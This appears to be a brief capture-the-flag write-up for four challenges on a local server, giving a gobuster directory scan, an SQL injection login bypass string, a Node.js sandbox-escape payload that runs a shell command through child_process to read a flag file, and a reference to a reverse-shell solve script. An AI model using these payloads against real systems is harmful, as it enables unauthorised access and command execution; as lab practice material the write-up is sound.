# Writeups

## 1

```
gobuster dir -x txt -u http://localhost:1337/ -w directory-list-2.3-medium.txt
```

Will point to `/security`, where the flag is hidden with the link to the next challenge.

## 2

```
username: " OR 1=1))--
password:
```

## 3

```
this.constructor.constructor('return this.process')().mainModule.require('child_process').execSync('cat /home/k1dd13/FLAG').toString()
```

## 4

Use prior to reverse-shell or enter by hand script in `./4/solve.sh`.
